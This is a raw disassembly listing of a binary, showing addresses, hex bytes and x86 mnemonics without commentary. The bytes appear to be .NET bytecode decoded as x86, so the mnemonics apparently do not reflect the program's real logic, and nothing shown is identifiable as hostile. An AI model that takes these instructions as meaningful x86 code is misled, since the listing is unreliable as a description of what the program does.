  402ab2:	02 17                	add    (%edi),%dl
  402ab4:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402ab7:	00 0a                	add    %cl,(%edx)
  402ab9:	02 02                	add    (%edx),%al
  402abb:	fe 06                	incb   (%esi)
  402abd:	2a 00                	sub    (%eax),%al
  402abf:	00 06                	add    %al,(%esi)
  402ac1:	73 62                	jae    0x402b25
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	0a 28                	or     (%eax),%ch
  402ac7:	63 00                	arpl   %eax,(%eax)
  402ac9:	00 0a                	add    %cl,(%edx)
  402acb:	02 02                	add    (%edx),%al
  402acd:	fe 06                	incb   (%esi)
  402acf:	2b 00                	sub    (%eax),%eax
  402ad1:	00 06                	add    %al,(%esi)
  402ad3:	73 62                	jae    0x402b37
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	0a 28                	or     (%eax),%ch
  402ad9:	64 00 00             	add    %al,%fs:(%eax)
  402adc:	0a 2a                	or     (%edx),%ch
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	03 30                	add    (%eax),%esi
  402ae2:	05 00 2d 01 00       	add    $0x12d00,%eax
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	7b 27                	jnp    0x402b16
  402aef:	00 00                	add    %al,(%eax)
  402af1:	04 39                	add    $0x39,%al
  402af3:	21 01                	and    %eax,(%ecx)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402afb:	00 04 04             	add    %al,(%esp,%eax,1)
  402afe:	6f                   	outsl  %ds:(%esi),(%dx)
  402aff:	65 00 00             	add    %al,%gs:(%eax)
  402b02:	0a 28                	or     (%eax),%ch
  402b04:	66 00 00             	data16 add %al,(%eax)
  402b07:	0a 02                	or     (%edx),%al
  402b09:	7c 28                	jl     0x402b33
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	04 04                	add    $0x4,%al
  402b0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b10:	67 00 00             	add    %al,(%bx,%si)
  402b13:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402b16:	68 00 00 0a 04       	push   $0x40a0000
  402b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1c:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402b22:	6a 00                	push   $0x0
  402b24:	00 0a                	add    %cl,(%edx)
  402b26:	5f                   	pop    %edi
  402b27:	28 26                	sub    %ah,(%esi)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	06                   	push   %es
  402b2c:	16                   	push   %ss
  402b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2e:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b31:	0a 28                	or     (%eax),%ch
  402b33:	6c                   	insb   (%dx),%es:(%edi)
  402b34:	00 00                	add    %al,(%eax)
  402b36:	0a 02                	or     (%edx),%al
  402b38:	7c 28                	jl     0x402b62
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	04 16                	add    $0x16,%al
  402b3e:	28 6d 00             	sub    %ch,0x0(%ebp)
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b47:	00 04 16             	add    %al,(%esi,%edx,1)
  402b4a:	28 6e 00             	sub    %ch,0x0(%esi)
  402b4d:	00 0a                	add    %cl,(%edx)
  402b4f:	04 6f                	add    $0x6f,%al
  402b51:	69 00 00 0a 2c 0c    	imul   $0xc2c0a00,(%eax),%eax
  402b57:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b5b:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402b5e:	28 6e 00             	sub    %ch,0x0(%esi)
  402b61:	00 0a                	add    %cl,(%edx)
  402b63:	04 6f                	add    $0x6f,%al
  402b65:	6a 00                	push   $0x0
  402b67:	00 0a                	add    %cl,(%edx)
  402b69:	2c 45                	sub    $0x45,%al
  402b6b:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b6f:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402b76:	0a 1f                	or     (%edi),%bl
  402b78:	0c 60                	or     $0x60,%al
  402b7a:	28 6e 00             	sub    %ch,0x0(%esi)
  402b7d:	00 0a                	add    %cl,(%edx)
  402b7f:	04 6f                	add    $0x6f,%al
  402b81:	69 00 00 0a 2d 29    	imul   $0x292d0a00,(%eax),%eax
  402b87:	04 6f                	add    $0x6f,%al
  402b89:	65 00 00             	add    %al,%gs:(%eax)
  402b8c:	0a 1f                	or     (%edi),%bl
  402b8e:	40                   	inc    %eax
  402b8f:	31 1f                	xor    %ebx,(%edi)
  402b91:	04 6f                	add    $0x6f,%al
  402b93:	65 00 00             	add    %al,%gs:(%eax)
  402b96:	0a 1f                	or     (%edi),%bl
  402b98:	60                   	pusha
  402b99:	2f                   	das
  402b9a:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402b9f:	00 04 04             	add    %al,(%esp,%eax,1)
  402ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba3:	65 00 00             	add    %al,%gs:(%eax)
  402ba6:	0a 1f                	or     (%edi),%bl
  402ba8:	40                   	inc    %eax
  402ba9:	59                   	pop    %ecx
  402baa:	d1 28                	shrl   $1,(%eax)
  402bac:	6c                   	insb   (%dx),%es:(%edi)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bb2:	68 00 00 0a 2c       	push   $0x2c0a0000
  402bb7:	14 02                	adc    $0x2,%al
  402bb9:	7c 28                	jl     0x402be3
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	04 25                	add    $0x25,%al
  402bbf:	28 6f 00             	sub    %ch,0x0(%edi)
  402bc2:	00 0a                	add    %cl,(%edx)
  402bc4:	1f                   	pop    %ds
  402bc5:	10 60 28             	adc    %ah,0x28(%eax)
  402bc8:	6e                   	outsb  %ds:(%esi),(%dx)
  402bc9:	00 00                	add    %al,(%eax)
  402bcb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bce:	70 00                	jo     0x402bd0
  402bd0:	00 0a                	add    %cl,(%edx)
  402bd2:	1f                   	pop    %ds
  402bd3:	14 5f                	adc    $0x5f,%al
  402bd5:	16                   	push   %ss
  402bd6:	31 17                	xor    %edx,(%edi)
  402bd8:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402bdc:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402be3:	0a 20                	or     (%eax),%ah
  402be5:	80 00 00             	addb   $0x0,(%eax)
  402be8:	00 60 28             	add    %ah,0x28(%eax)
  402beb:	6e                   	outsb  %ds:(%esi),(%dx)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bf1:	70 00                	jo     0x402bf3
  402bf3:	00 0a                	add    %cl,(%edx)
  402bf5:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402bfb:	16                   	push   %ss
  402bfc:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402bff:	7c 28                	jl     0x402c29
  402c01:	00 00                	add    %al,(%eax)
  402c03:	04 25                	add    $0x25,%al
  402c05:	28 6f 00             	sub    %ch,0x0(%edi)
  402c08:	00 0a                	add    %cl,(%edx)
  402c0a:	1f                   	pop    %ds
  402c0b:	20 60 28             	and    %ah,0x28(%eax)
  402c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  402c0f:	00 00                	add    %al,(%eax)
  402c11:	0a 02                	or     (%edx),%al
  402c13:	28 17                	sub    %dl,(%edi)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	0a 2a                	or     (%edx),%ch
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	00 03                	add    %al,(%ebx)
  402c1d:	30 05 00 2d 01 00    	xor    %al,0x12d00
  402c23:	00 00                	add    %al,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 02                	add    %al,(%edx)
  402c29:	7b 27                	jnp    0x402c52
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	04 3a                	add    $0x3a,%al
  402c2f:	21 01                	and    %eax,(%ecx)
  402c31:	00 00                	add    %al,(%eax)
  402c33:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c37:	00 04 04             	add    %al,(%esp,%eax,1)
  402c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c3b:	65 00 00             	add    %al,%gs:(%eax)
  402c3e:	0a 28                	or     (%eax),%ch
  402c40:	66 00 00             	data16 add %al,(%eax)
  402c43:	0a 02                	or     (%edx),%al
  402c45:	7c 28                	jl     0x402c6f
  402c47:	00 00                	add    %al,(%eax)
  402c49:	04 04                	add    $0x4,%al
  402c4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4c:	67 00 00             	add    %al,(%bx,%si)
  402c4f:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402c52:	68 00 00 0a 04       	push   $0x40a0000
  402c57:	6f                   	outsl  %ds:(%esi),(%dx)
  402c58:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402c5e:	6a 00                	push   $0x0
  402c60:	00 0a                	add    %cl,(%edx)
  402c62:	5f                   	pop    %edi
  402c63:	28 26                	sub    %ah,(%esi)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	06                   	push   %es
  402c68:	16                   	push   %ss
  402c69:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6a:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c6d:	0a 28                	or     (%eax),%ch
  402c6f:	6c                   	insb   (%dx),%es:(%edi)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	0a 02                	or     (%edx),%al
  402c74:	7c 28                	jl     0x402c9e
  402c76:	00 00                	add    %al,(%eax)
  402c78:	04 17                	add    $0x17,%al
  402c7a:	28 6d 00             	sub    %ch,0x0(%ebp)
  402c7d:	00 0a                	add    %cl,(%edx)
  402c7f:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c83:	00 04 16             	add    %al,(%esi,%edx,1)
  402c86:	28 6e 00             	sub    %ch,0x0(%esi)
  402c89:	00 0a                	add    %cl,(%edx)
  402c8b:	04 6f                	add    $0x6f,%al
  402c8d:	69 00 00 0a 2c 0c    	imul   $0xc2c0a00,(%eax),%eax
  402c93:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c97:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402c9a:	28 6e 00             	sub    %ch,0x0(%esi)
  402c9d:	00 0a                	add    %cl,(%edx)
  402c9f:	04 6f                	add    $0x6f,%al
  402ca1:	6a 00                	push   $0x0
  402ca3:	00 0a                	add    %cl,(%edx)
  402ca5:	2c 45                	sub    $0x45,%al
  402ca7:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402cab:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402cb2:	0a 1f                	or     (%edi),%bl
  402cb4:	0c 60                	or     $0x60,%al
  402cb6:	28 6e 00             	sub    %ch,0x0(%esi)
  402cb9:	00 0a                	add    %cl,(%edx)
  402cbb:	04 6f                	add    $0x6f,%al
  402cbd:	69 00 00 0a 2d 29    	imul   $0x292d0a00,(%eax),%eax
  402cc3:	04 6f                	add    $0x6f,%al
  402cc5:	65 00 00             	add    %al,%gs:(%eax)
  402cc8:	0a 1f                	or     (%edi),%bl
  402cca:	40                   	inc    %eax
  402ccb:	31 1f                	xor    %ebx,(%edi)
  402ccd:	04 6f                	add    $0x6f,%al
  402ccf:	65 00 00             	add    %al,%gs:(%eax)
  402cd2:	0a 1f                	or     (%edi),%bl
  402cd4:	60                   	pusha
  402cd5:	2f                   	das
  402cd6:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402cdb:	00 04 04             	add    %al,(%esp,%eax,1)
  402cde:	6f                   	outsl  %ds:(%esi),(%dx)
  402cdf:	65 00 00             	add    %al,%gs:(%eax)
  402ce2:	0a 1f                	or     (%edi),%bl
  402ce4:	40                   	inc    %eax
  402ce5:	59                   	pop    %ecx
  402ce6:	d1 28                	shrl   $1,(%eax)
  402ce8:	6c                   	insb   (%dx),%es:(%edi)
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402cee:	68 00 00 0a 2c       	push   $0x2c0a0000
  402cf3:	14 02                	adc    $0x2,%al
  402cf5:	7c 28                	jl     0x402d1f
  402cf7:	00 00                	add    %al,(%eax)
  402cf9:	04 25                	add    $0x25,%al
  402cfb:	28 6f 00             	sub    %ch,0x0(%edi)
  402cfe:	00 0a                	add    %cl,(%edx)
  402d00:	1f                   	pop    %ds
  402d01:	10 60 28             	adc    %ah,0x28(%eax)
  402d04:	6e                   	outsb  %ds:(%esi),(%dx)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d0a:	70 00                	jo     0x402d0c
  402d0c:	00 0a                	add    %cl,(%edx)
  402d0e:	1f                   	pop    %ds
  402d0f:	14 5f                	adc    $0x5f,%al
  402d11:	16                   	push   %ss
  402d12:	31 17                	xor    %edx,(%edi)
  402d14:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402d18:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402d1f:	0a 20                	or     (%eax),%ah
  402d21:	80 00 00             	addb   $0x0,(%eax)
  402d24:	00 60 28             	add    %ah,0x28(%eax)
  402d27:	6e                   	outsb  %ds:(%esi),(%dx)
  402d28:	00 00                	add    %al,(%eax)
  402d2a:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d2d:	70 00                	jo     0x402d2f
  402d2f:	00 0a                	add    %cl,(%edx)
  402d31:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402d37:	16                   	push   %ss
  402d38:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402d3b:	7c 28                	jl     0x402d65
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	04 25                	add    $0x25,%al
  402d41:	28 6f 00             	sub    %ch,0x0(%edi)
  402d44:	00 0a                	add    %cl,(%edx)
  402d46:	1f                   	pop    %ds
  402d47:	20 60 28             	and    %ah,0x28(%eax)
  402d4a:	6e                   	outsb  %ds:(%esi),(%dx)
  402d4b:	00 00                	add    %al,(%eax)
  402d4d:	0a 02                	or     (%edx),%al
  402d4f:	28 17                	sub    %dl,(%edi)
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 2a                	or     (%edx),%ch
  402d55:	00 00                	add    %al,(%eax)
  402d57:	00 13                	add    %dl,(%ebx)
  402d59:	30 01                	xor    %al,(%ecx)
  402d5b:	00 da                	add    %bl,%dl
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	00 09                	add    %cl,(%ecx)
  402d61:	00 00                	add    %al,(%eax)
  402d63:	11 03                	adc    %eax,(%ebx)
  402d65:	0a 06                	or     (%esi),%al
  402d67:	45                   	inc    %ebp
  402d68:	10 00                	adc    %al,(%eax)
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	05 00 00 00 17       	add    $0x17000000,%eax
  402d71:	00 00                	add    %al,(%eax)
  402d73:	00 2d 00 00 00 38    	add    %ch,0x38000000
  402d79:	00 00                	add    %al,(%eax)
  402d7b:	00 4e 00             	add    %cl,0x0(%esi)
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	43                   	inc    %ebx
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 59 00             	add    %bl,0x0(%ecx)
  402d86:	00 00                	add    %al,(%eax)
  402d88:	64 00 00             	add    %al,%fs:(%eax)
  402d8b:	00 22                	add    %ah,(%edx)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	00 0b                	add    %cl,(%ebx)
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 6f 00             	add    %ch,0x0(%edi)
  402d96:	00 00                	add    %al,(%eax)
  402d98:	11 00                	adc    %eax,(%eax)
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	80 00 00             	addb   $0x0,(%eax)
  402d9f:	00 7a 00             	add    %bh,0x0(%edx)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	8c 00                	mov    %es,(%eax)
  402da6:	00 00                	add    %al,(%eax)
  402da8:	86 00                	xchg   %al,(%eax)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	38 87 00 00 00 28    	cmp    %al,0x28000000(%edi)
  402db2:	71 00                	jno    0x402db4
  402db4:	00 0a                	add    %cl,(%edx)
  402db6:	2a 28                	sub    (%eax),%ch
  402db8:	72 00                	jb     0x402dba
  402dba:	00 0a                	add    %cl,(%edx)
  402dbc:	2a 28                	sub    (%eax),%ch
  402dbe:	73 00                	jae    0x402dc0
  402dc0:	00 0a                	add    %cl,(%edx)
  402dc2:	2a 72 77             	sub    0x77(%edx),%dh
  402dc5:	00 00                	add    %al,(%eax)
  402dc7:	70 28                	jo     0x402df1
  402dc9:	74 00                	je     0x402dcb
  402dcb:	00 0a                	add    %cl,(%edx)
  402dcd:	2a 72 87             	sub    -0x79(%edx),%dh
  402dd0:	00 00                	add    %al,(%eax)
  402dd2:	70 28                	jo     0x402dfc
  402dd4:	74 00                	je     0x402dd6
  402dd6:	00 0a                	add    %cl,(%edx)
  402dd8:	2a 72 97             	sub    -0x69(%edx),%dh
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	70 28                	jo     0x402e07
  402ddf:	74 00                	je     0x402de1
  402de1:	00 0a                	add    %cl,(%edx)
  402de3:	2a 72 a7             	sub    -0x59(%edx),%dh
  402de6:	00 00                	add    %al,(%eax)
  402de8:	70 28                	jo     0x402e12
  402dea:	74 00                	je     0x402dec
  402dec:	00 0a                	add    %cl,(%edx)
  402dee:	2a 72 b7             	sub    -0x49(%edx),%dh
  402df1:	00 00                	add    %al,(%eax)
  402df3:	70 28                	jo     0x402e1d
  402df5:	74 00                	je     0x402df7
  402df7:	00 0a                	add    %cl,(%edx)
  402df9:	2a 72 c7             	sub    -0x39(%edx),%dh
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	70 28                	jo     0x402e28
  402e00:	74 00                	je     0x402e02
  402e02:	00 0a                	add    %cl,(%edx)
  402e04:	2a 72 d7             	sub    -0x29(%edx),%dh
  402e07:	00 00                	add    %al,(%eax)
  402e09:	70 28                	jo     0x402e33
  402e0b:	74 00                	je     0x402e0d
  402e0d:	00 0a                	add    %cl,(%edx)
  402e0f:	2a 72 e7             	sub    -0x19(%edx),%dh
  402e12:	00 00                	add    %al,(%eax)
  402e14:	70 28                	jo     0x402e3e
  402e16:	74 00                	je     0x402e18
  402e18:	00 0a                	add    %cl,(%edx)
  402e1a:	2a 72 f7             	sub    -0x9(%edx),%dh
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	70 28                	jo     0x402e49
  402e21:	74 00                	je     0x402e23
  402e23:	00 0a                	add    %cl,(%edx)
  402e25:	2a 28                	sub    (%eax),%ch
  402e27:	75 00                	jne    0x402e29
  402e29:	00 0a                	add    %cl,(%edx)
  402e2b:	2a 28                	sub    (%eax),%ch
  402e2d:	76 00                	jbe    0x402e2f
  402e2f:	00 0a                	add    %cl,(%edx)
  402e31:	2a 28                	sub    (%eax),%ch
  402e33:	77 00                	ja     0x402e35
  402e35:	00 0a                	add    %cl,(%edx)
  402e37:	2a 28                	sub    (%eax),%ch
  402e39:	78 00                	js     0x402e3b
  402e3b:	00 0a                	add    %cl,(%edx)
  402e3d:	2a 00                	sub    (%eax),%al
  402e3f:	00 03                	add    %al,(%ebx)
  402e41:	30 03                	xor    %al,(%ebx)
  402e43:	00 c6                	add    %al,%dh
  402e45:	00 00                	add    %al,(%eax)
  402e47:	00 00                	add    %al,(%eax)
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	00 02                	add    %al,(%edx)
  402e4d:	28 79 00             	sub    %bh,0x0(%ecx)
  402e50:	00 0a                	add    %cl,(%edx)
  402e52:	02 22                	add    (%edx),%ah
  402e54:	00 00                	add    %al,(%eax)
  402e56:	c0 40 22 00          	rolb   $0x0,0x22(%eax)
  402e5a:	00 50 41             	add    %dl,0x41(%eax)
  402e5d:	73 2a                	jae    0x402e89
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	0a 28                	or     (%eax),%ch
  402e63:	2b 00                	sub    (%eax),%eax
  402e65:	00 0a                	add    %cl,(%edx)
  402e67:	02 17                	add    (%edi),%dl
  402e69:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402e6c:	00 0a                	add    %cl,(%edx)
  402e6e:	02 17                	add    (%edi),%dl
  402e70:	6f                   	outsl  %ds:(%esi),(%dx)
  402e71:	7a 00                	jp     0x402e73
  402e73:	00 0a                	add    %cl,(%edx)
  402e75:	02 28                	add    (%eax),%ch
  402e77:	27                   	daa
  402e78:	00 00                	add    %al,(%eax)
  402e7a:	0a 6f 28             	or     0x28(%edi),%ch
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	0a 6f 30             	or     0x30(%edi),%ch
  402e82:	00 00                	add    %al,(%eax)
  402e84:	0a 02                	or     (%edx),%al
  402e86:	20 93 00 00 00 28    	and    %dl,0x28000000(%ebx)
  402e8c:	59                   	pop    %ecx
  402e8d:	00 00                	add    %al,(%eax)
  402e8f:	0a 02                	or     (%edx),%al
  402e91:	20 20                	and    %ah,(%eax)
  402e93:	03 00                	add    (%eax),%eax
  402e95:	00 28                	add    %ch,(%eax)
  402e97:	5a                   	pop    %edx
  402e98:	00 00                	add    %al,(%eax)
  402e9a:	0a 02                	or     (%edx),%al
  402e9c:	28 77 00             	sub    %dh,0x0(%edi)
  402e9f:	00 0a                	add    %cl,(%edx)
  402ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea2:	7b 00                	jnp    0x402ea4
  402ea4:	00 0a                	add    %cl,(%edx)
  402ea6:	02 17                	add    (%edi),%dl
  402ea8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402eac:	0a 02                	or     (%edx),%al
  402eae:	16                   	push   %ss
  402eaf:	28 4a 00             	sub    %cl,0x0(%edx)
  402eb2:	00 0a                	add    %cl,(%edx)
  402eb4:	02 16                	add    (%esi),%dl
  402eb6:	28 4b 00             	sub    %cl,0x0(%ebx)
  402eb9:	00 0a                	add    %cl,(%edx)
  402ebb:	02 16                	add    (%esi),%dl
  402ebd:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  402ec1:	0a 02                	or     (%edx),%al
  402ec3:	17                   	pop    %ss
  402ec4:	28 45 00             	sub    %al,0x0(%ebp)
  402ec7:	00 0a                	add    %cl,(%edx)
  402ec9:	02 28                	add    (%eax),%ch
  402ecb:	7d 00                	jge    0x402ecd
  402ecd:	00 0a                	add    %cl,(%edx)
  402ecf:	02 7b 2a             	add    0x2a(%ebx),%bh
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	04 02                	add    $0x2,%al
  402ed6:	fe 06                	incb   (%esi)
  402ed8:	2e 00 00             	add    %al,%cs:(%eax)
  402edb:	06                   	push   %es
  402edc:	73 7e                	jae    0x402f5c
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	0a 6f 7f             	or     0x7f(%edi),%ch
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	0a 02                	or     (%edx),%al
  402ee7:	7b 2a                	jnp    0x402f13
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	04 23                	add    $0x23,%al
  402eed:	00 00                	add    %al,(%eax)
  402eef:	00 00                	add    %al,(%eax)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	49                   	dec    %ecx
  402ef4:	40                   	inc    %eax
  402ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef6:	80 00 00             	addb   $0x0,(%eax)
  402ef9:	0a 02                	or     (%edx),%al
  402efb:	7b 2a                	jnp    0x402f27
  402efd:	00 00                	add    %al,(%eax)
  402eff:	04 17                	add    $0x17,%al
  402f01:	6f                   	outsl  %ds:(%esi),(%dx)
  402f02:	81 00 00 0a 02 7b    	addl   $0x7b020a00,(%eax)
  402f08:	2a 00                	sub    (%eax),%al
  402f0a:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402f0d:	82 00 00             	addb   $0x0,(%eax)
  402f10:	0a 2a                	or     (%edx),%ch
  402f12:	00 00                	add    %al,(%eax)
  402f14:	03 30                	add    (%eax),%esi
  402f16:	02 00                	add    (%eax),%al
  402f18:	6d                   	insl   (%dx),%es:(%edi)
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	00 00                	add    %al,(%eax)
  402f1f:	00 02                	add    %al,(%edx)
  402f21:	7b 2d                	jnp    0x402f50
  402f23:	00 00                	add    %al,(%eax)
  402f25:	04 2c                	add    $0x2c,%al
  402f27:	01 2a                	add    %ebp,(%edx)
  402f29:	02 17                	add    (%edi),%dl
  402f2b:	7d 2d                	jge    0x402f5a
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	04 02                	add    $0x2,%al
  402f31:	7b 2b                	jnp    0x402f5e
  402f33:	00 00                	add    %al,(%eax)
  402f35:	04 16                	add    $0x16,%al
  402f37:	32 4c 02 7b          	xor    0x7b(%edx,%eax,1),%cl
  402f3b:	2c 00                	sub    $0x0,%al
  402f3d:	00 04 16             	add    %al,(%esi,%edx,1)
  402f40:	32 28                	xor    (%eax),%ch
  402f42:	02 7b 2e             	add    0x2e(%ebx),%bh
  402f45:	00 00                	add    %al,(%eax)
  402f47:	04 02                	add    $0x2,%al
  402f49:	7b 2b                	jnp    0x402f76
  402f4b:	00 00                	add    %al,(%eax)
  402f4d:	04 6f                	add    $0x6f,%al
  402f4f:	83 00 00             	addl   $0x0,(%eax)
  402f52:	0a 7b 31             	or     0x31(%ebx),%bh
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 02                	add    $0x2,%al
  402f59:	7b 2c                	jnp    0x402f87
  402f5b:	00 00                	add    %al,(%eax)
  402f5d:	04 6f                	add    $0x6f,%al
  402f5f:	84 00                	test   %al,(%eax)
  402f61:	00 0a                	add    %cl,(%edx)
  402f63:	02 15 7d 2c 00 00    	add    0x2c7d,%dl
  402f69:	04 02                	add    $0x2,%al
  402f6b:	7b 2e                	jnp    0x402f9b
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	04 02                	add    $0x2,%al
  402f71:	7b 2b                	jnp    0x402f9e
  402f73:	00 00                	add    %al,(%eax)
  402f75:	04 6f                	add    $0x6f,%al
  402f77:	83 00 00             	addl   $0x0,(%eax)
  402f7a:	0a 7b 31             	or     0x31(%ebx),%bh
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	04 6f                	add    $0x6f,%al
  402f81:	85 00                	test   %eax,(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	02 16                	add    (%esi),%dl
  402f87:	7d 2d                	jge    0x402fb6
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	04 2a                	add    $0x2a,%al
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 03                	add    %al,(%ebx)
  402f91:	30 04 00             	xor    %al,(%eax,%eax,1)
  402f94:	83 02 00             	addl   $0x0,(%edx)
  402f97:	00 00                	add    %al,(%eax)
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	00 03                	add    %al,(%ebx)
  402f9d:	73 2d                	jae    0x402fcc
  402f9f:	00 00                	add    %al,(%eax)
  402fa1:	0a 7d 2f             	or     0x2f(%ebp),%bh
  402fa4:	00 00                	add    %al,(%eax)
  402fa6:	04 03                	add    $0x3,%al
  402fa8:	7b 2f                	jnp    0x402fd9
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 1b                	add    $0x1b,%al
  402fae:	6f                   	outsl  %ds:(%esi),(%dx)
  402faf:	86 00                	xchg   %al,(%eax)
  402fb1:	00 0a                	add    %cl,(%edx)
  402fb3:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	04 1f                	add    $0x1f,%al
  402fba:	68 04 5a 1f 0a       	push   $0xa1f5a04
  402fbf:	58                   	pop    %eax
  402fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc1:	87 00                	xchg   %eax,(%eax)
  402fc3:	00 0a                	add    %cl,(%edx)
  402fc5:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fc8:	00 00                	add    %al,(%eax)
  402fca:	04 20                	add    $0x20,%al
  402fcc:	0c 03                	or     $0x3,%al
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd1:	5a                   	pop    %edx
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 03                	or     (%ebx),%al
  402fd6:	7b 2f                	jnp    0x403007
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	04 1f                	add    $0x1f,%al
  402fdc:	10 6f 59             	adc    %ch,0x59(%edi)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	0a 03                	or     (%ebx),%al
  402fe3:	7b 2f                	jnp    0x403014
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	04 03                	add    $0x3,%al
  402fe9:	7b 2f                	jnp    0x40301a
  402feb:	00 00                	add    %al,(%eax)
  402fed:	04 6f                	add    $0x6f,%al
  402fef:	88 00                	mov    %al,(%eax)
  402ff1:	00 0a                	add    %cl,(%edx)
  402ff3:	17                   	pop    %ss
  402ff4:	73 89                	jae    0x402f7f
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	0a 6f 8a             	or     -0x76(%edi),%ch
  402ffb:	00 00                	add    %al,(%eax)
  402ffd:	0a 03                	or     (%ebx),%al
